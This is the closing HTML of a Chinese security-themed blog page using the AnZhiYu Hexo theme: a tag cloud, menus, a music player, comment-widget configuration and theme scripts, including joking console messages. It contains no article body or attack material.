href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>